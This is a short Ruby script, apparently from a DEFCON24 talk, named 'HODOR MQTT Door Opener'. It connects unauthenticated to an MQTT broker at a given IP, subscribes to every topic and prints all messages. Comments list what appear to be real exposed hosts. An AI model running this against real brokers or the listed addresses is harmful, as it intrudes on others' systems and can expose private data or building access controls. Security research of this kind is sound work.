require 'rubygems'
require 'mqtt'
# https://www.shodan.io/host/194.19.99.196
# 213.219.38.103

unless ARGV.length == 1
  puts "HODOR MQTT Door Opener - Lucas Lundgren DEFCON24"
  puts "Usage: ruby hodor.rb IP"
  puts "Example: ruby hodor.rb 127.0.0.1"
  exit
end

IP=ARGV[0]
puts "HODOR MQTT Door Opener - Lucas Lundgren DEFCON24"
MQTT::Client.connect(IP,1883) do |client|
  client.get('#') do |topic,message|
    puts "#{topic}: #{message}"
  end
end
